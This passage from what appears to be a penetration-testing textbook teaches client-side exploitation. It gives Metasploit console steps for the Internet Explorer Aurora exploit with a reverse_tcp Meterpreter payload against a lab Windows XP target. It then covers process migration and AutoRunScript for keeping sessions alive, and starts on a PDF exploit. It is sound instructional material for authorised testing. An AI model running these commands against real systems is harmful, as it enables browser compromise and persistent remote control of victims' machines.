can hijack execution.
Unfortunately, the success of client-side attacks relies on somehow
making sure that our exploit is downloaded and opened in a vulnerable
product. In the next chapter, we’ll look at some techniques to lure users
into opening malicious files; for now we’ll look at some client-side exploits,
beginning with what must be the most popular target for client-side exploi-
tation: web browsers.
Browser Exploitation
Web browsers are made up of code to render web pages. Just as we can send
malformed input to server software, if we open a web page with malicious
code to trigger a security issue, we can potentially hijack execution in the
browser and execute a payload. Though the delivery is a bit different, the fun-
damental concept is the same. All of the most common browsers have been
subject to security issues—Internet Explorer, Firefox, and even Mobile Safari.
iPHone JailBreaking Via Browser exPloitation
In the past, browser exploitation has been instrumental in iPhone jailbreak-
ing . While later versions of iOS implement a security feature called mandatory
code signing, which requires that all executed code be approved by Apple,
Mobile Safari (the web browser on the iPhone) gets a pass because to render
web pages, it must be able to run unsigned code . Apple can’t go through all the
pages on the Internet and sign everything that doesn’t contain malicious code .
And if the iPhone can’t view web pages, everyone will just go buy an Android
phone—the last thing Apple wants . When iOS 4 renders PDF documents in
Mobile Safari, one of the fonts includes a security vulnerability . This client-side
attack allows jailbreakers to gain a foothold on iPhones just by tricking a user
into opening a malicious link in the browser .
Client-Side Exploitation 219
Let’s consider a famous vulnerability in Internet Explorer. The Aurora
exploit was used in 2010 against major companies such as Google, Adobe,
and Yahoo!. At the time of the Aurora attacks, Internet Explorer contained a
zero-day vulnerability—that is, a vulnerability that had not yet been patched.
(Even a fully updated version of Internet Explorer could be compromised
if a user could be tricked into opening a malicious web page, triggering the
vulnerability.)
Microsoft has released patches for Internet Explorer, but as with other
security patches, users sometimes overlook updating their browsers, and the
version of Internet Explorer installed on the Windows XP target doesn’t have
the necessary security patch to protect against the Aurora exploit.
We’ll use Metasploit to take control of a target machine by attacking a
vulnerable browser using the Aurora Metasploit module, exploit/windows/
browser/ms10_002_aurora, shown in Listing 10-2.
note Client-side Metasploit modules are fundamentally the same as the server-side mod-
ules we have used so far, except that the options are a bit different: Instead of sending
exploits to a remote host on the network, we set up a server and wait for a browser to
access our page.
msf > use exploit/windows/browser/ms10_002_aurora
msf exploit(ms10_002_aurora) > show options
Module options (exploit/windows/browser/ms10_002_aurora):
Name Current Setting Required Description
---- --------------- -------- -----------
uSRVHOST 0.0.0.0 yes The local host to listen on. This must be an address
on the local machine or 0.0.0.0
vSRVPORT 8080 yes The local port to listen on.
wSSL false no Negotiate SSL for incoming connections
SSLCert no Path to a custom SSL certificate (default is randomly
generated)
SSLVersion SSL3 no Specify the version of SSL that should be used
(accepted: SSL2, SSL3, TLS1)
xURIPATH no The URI to use for this exploit (default is random)
Exploit target:
Id Name
-- ----
y0 Automatic
Listing 10-2: Internet Explorer Aurora Metasploit module
Notice in the options for the module that instead of RHOST we see the
SRVHOST u option. This is the local IP address for the server. By default this
address is set to 0.0.0.0 to listen on all addresses on the local system. The
220 Chapter 10
default port to listen on, the SRVPORT v option, is 8080. You can change this
port number to 80 (the default port for web servers) as long as no other
program is using the port. You can even use an SSL connection w.
If we set the URIPATH x option, we can specify a specific URL for the
malicious page. If we don’t set anything here, a random URL will be used.
Because the exploitation will take place entirely inside the browser, our
exploit will work regardless of the version of Windows running y, as long
as Internet Explorer is subject to the Aurora vulnerability.
Next we set the module options for our environment. The payloads
for this module are the same as the Windows payloads we’ve already seen.
Exploiting the browser is no different from exploiting any other program
on the system, and we can run the same shellcode. We’ll use the windows/
meterpreter/reverse_tcp payload for this example to illustrate some client-side
attack concepts, as shown in Listing 10-3.
note Make sure the apache2 web server is not running on port 80 with service
apache2 stop.
msf exploit(ms10_002_aurora) > set SRVHOST 192.168.20.9
SRVHOST => 192.168.20.9
msf exploit(ms10_002_aurora) > set SRVPORT 80
SRVPORT => 80
msf exploit(ms10_002_aurora) > set URIPATH aurora
URIPATH => aurora
msf exploit(ms10_002_aurora) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms10_002_aurora) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(ms10_002_aurora) > exploit
[*] Exploit running as background job.
[*] Started reverse handler on 192.168.20.9:4444 u
[*] Using URL: http://192.168.20.9:80/aurora v
[*] Server started.
Listing 10-3: Setting options and launching the Aurora module
As you can see in Listing 10-3, once we’ve set the options and run the
module, a web server is started in the background on the selected SRVPORT at
the selected URIPATH as shown at v. Additionally, a handler is set up for the
selected payload u.
Now we’ll use Internet Explorer on the Windows XP target to browse
to the malicious site. In Metasploit you should see that the page has been
served and is attempting to exploit the vulnerability, as shown in Listing 10-4.
Although our Windows XP browser is vulnerable, it may take a couple tries
to exploit the browser successfully.
Exploiting the Aurora vulnerability is not as reliable as exploiting the
other vulnerabilities we’ve discussed so far in this book. If Internet Explorer
crashes, but you do not receive a session, try browsing to the exploit page
again.
Client-Side Exploitation 221
msf exploit(ms10_002_aurora) > [*] 192.168.20.10 ms10_002_aurora -
Sending Internet Explorer "Aurora" Memory Corruption
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:1376) at
2015-05-05 20:23:25 -0400 u
Listing 10-4: Receiving a client-side session
Though this exploit may not work every time, the target browser is vul-
nerable and a couple of tries should do it. If the exploit succeeds, you will
receive a session, as shown at u. We are not automatically dropped into the
session. Use sessions -i  to interact with the Meterpreter session.
Though we have successfully exploited the browser and gained a foot-
hold on the target system, our challenges are not over. If you look back at the
Windows XP machine and try to continue using Internet Explorer, you’ll find
that it’s no longer functioning. The exploitation involved in getting our ses-
sion has made the browser unusable. The problem for us is that users who
have been tricked into visiting our malicious site will naturally want to con-
tinue using their browsers. They may force-quit the browser, or the browser
may crash on its own due to its unstable state. When the browser closes, we
lose our Meterpreter session.
msf exploit(ms10_002_aurora) > [*] 192.168.20.10 - Meterpreter session 1 closed. Reason: Diedu
Our Meterpreter payload resides entirely inside the memory of the
exploited process. If the browser dies or is closed by the user, our session
also dies, as you can see at u. We can lose our foothold on the system just
as quickly as we gained it.
We need a way to keep our Meterpreter session alive, even if the exploited
process—in this case, the Internet Explorer browser—dies. But first, we
need to stop our Metasploit web server so we can make some changes to the
malicious page to fix this problem, as shown in Listing 10-5.
msf exploit(ms10_002_aurora) > jobsu
Jobs
====
Id Name
-- ----
0 Exploit: windows/browser/ms10_002_aurora
msf exploit(ms10_002_aurora) > kill 0v
Stopping job: 0...
[*] Server stopped.
Listing 10-5: Killing a background job in Metasploit
We can see everything running in the background in Metasploit by enter-
ing jobs u. To stop a job running in the background, enter kill  v.
222 Chapter 10
Because Meterpreter lives entirely inside the memory of the exploited
process and that process is doomed to die, we need some way to move our
session out of the Internet Explorer process and into one that is more likely
to stick around.
Running Scripts in a Meterpreter Session
Unlike network attacks, where we will see a session right away if our attack
succeeds, when performing client-side attacks, we must wait until a user
accesses our malicious page. Even if we find a way to move Meterpreter into
another process, sessions could come in at any time. We can’t be distracted
at any point during our pentest or we risk losing a session. It would be ideal
if we could automatically run commands in our Meterpreter session so that
we don’t have to sit idly, waiting for a browser to access our malicious server.
Meterpreter scripts that can be run in an open session can be found at
/usr/share/metasploit-framework/scripts/meterpreter in Kali. We’ll look at more
examples of Meterpreter scripts in Chapter 13, but for now let’s look at one
specific Meterpreter script that will work well with our current scenario. The
script migrate.rb allows us to move Meterpreter from the memory of one pro-
cess to another, which is exactly what we need here. To run a Meterpreter
script inside an active Meterpreter session, enter run , as shown
in Listing 10-6. You may be presented with help information about how to
use the script correctly, as we are shown here.
meterpreter > run migrate
OPTIONS:
-f Launch a process and migrate into the new process u
-h Help menu.
-k Kill original process.
-n  Migrate into the first process with this executable name (explorer.exe) v
-p  PID to migrate to. w
Listing 10-6: Running a Meterpreter script
When we attempt to run the migrate script, we see a few options. We can
launch a new process and migrate into that process, as shown at u; migrate
into a process with a given name v; or choose the process by process ID, as
shown at w.
advanced Parameters
In addition to the module and payload options, Metasploit modules have
advanced parameters. We can see the available advanced parameters with
the command show advanced, as shown in Listing 10-7.
msf exploit(ms10_002_aurora) > show advanced
Module advanced options:
Client-Side Exploitation 223
Name : ContextInformationFile
Current Setting:
Description : The information file that contains context information
--snip--
Name : AutoRunScriptu
Current Setting:
Description : A script to run automatically on session creation.
--snip--
Name : WORKSPACE
Current Setting:
Description : Specify the workspace for this module
Listing 10-7: Metasploit advanced parameters
One of the advanced settings for our chosen payload is AutoRunScript u.
When set, this setting will allow us to automatically run a Meterpreter script
when a session opens.
We can set this parameter to automatically run the migrate script when
a Meterpreter session opens. This way, when the browser dies, as long as
the migrate script has finished, our session will be safe from the crash.
Additionally, by running the script automatically, we can migrate whenever
a user accesses the malicious page, regardless of whether you have your eyes
on Msfconsole when the session comes in, as shown in Listing 10-8.
msf exploit(ms10_002_aurora) > set AutoRunScript migrate -fu
AutoRunScript => migrate -f
msf exploit(ms10_002_aurora) > exploit
[*] Exploit running as background job.
[*] Started reverse handler on 192.168.20.9:4444
[*] Using URL: http://192.168.20.9:80/aurora
[*] Server started.
Listing 10-8: Setting the AutoRunScript parameter
To set advanced parameters, use the syntax set  
(the same as setting regular options). For example, in Listing 10-8, we tell
the migrate script to spawn a new process to migrate into with the -f flag u,
and then we start the malicious server again.
Now browse to the malicious page from the Windows XP target again
(see Listing 10-9).
msf exploit(ms10_002_aurora) > [*] 192.168.20.10 ms10_002_aurora - Sending Internet
Explorer "Aurora" Memory Corruption
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1422) at 2015-05-05 20:26:15 -0400
[*] Session ID 2 (192.168.20.9:4444 -> 192.168.20.10:1422) processing AutoRunScript 'migrate -f' u
[*] Current server process: iexplore.exe (3476)
224 Chapter 10
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 484
[+] Successfully migrated to process v
Listing 10-9: Automatically migrating
This time we get a session saying that the AutoRunScript parameter is pro-
cessed automatically u. The migrate script spawns a notepad.exe process and
moves into it v. When Internet Explorer dies, our session remains alive.
Though automatically migrating is a good idea when using a browser
exploit, it still takes a few seconds for the migration to happen—seconds
during which the user could close the browser and kill our session. Fortunately,
the advanced Meterpreter option PrependMigrate, shown here, will migrate
even faster, before the payload is run.
Name : PrependMigrate
Current Setting: false
Description : Spawns and runs shellcode in new process
You can set this option to true as an alternative to the AutoRunScript we
used earlier.
This has been just one example of a browser exploit. Metasploit has
other modules for exploiting vulnerabilities in Internet Explorer as well
as other popular web browsers. As more organizations have hardened their
external security posture, browser exploitation has given over the keys to
the kingdom in many pentests as well as attacks.
note The Aurora vulnerability was patched in 2010, but users and organizations are
bad at keeping their browsers up to date, so this exploit still finds targets today.
Additionally, though new remote exploits for operating systems are rare, major
browsers such as Internet Explorer fall victim to new client-side attacks on a regular
basis. Use Msfupdate as discussed in Chapter 4 to get the latest modules for new
vulnerabilities, some of which may not even be patched by the vendor at the time of
the module’s release. Note that running Msfupdate may affect how Metasploit works,
which may make it more difficult to follow along with the book. Therefore, you may
not want to update Metasploit until after you have read through the book.
Now let’s look at some other client-side software that can be exploited
to gain command execution on a target system.
PDF Exploits
Portable Document Format (PDF) software can also be exploited. If a
user can be enticed to open a malicious PDF in a vulnerable viewer, the
program can be exploited.
The most popular PDF viewer for Windows systems is Adobe Reader.
Like browsers, Adobe Reader has a history littered with security holes. Also
like browsers, even when a patch-management process is in place, regu-
larly updating the underlying operating system, PDF software is often for-
gotten, and remains at an older, vulnerable version.
Client-Side Exploitation 225
Exploiting a PDF Vulnerability
Our Windows XP target has an outdated version of Adobe Reader 8.1.2
installed that is subject to CVE-2008-2992, a stack-based buffer over-
flow. The corresponding Metasploit module is exploit/windows/fileformat/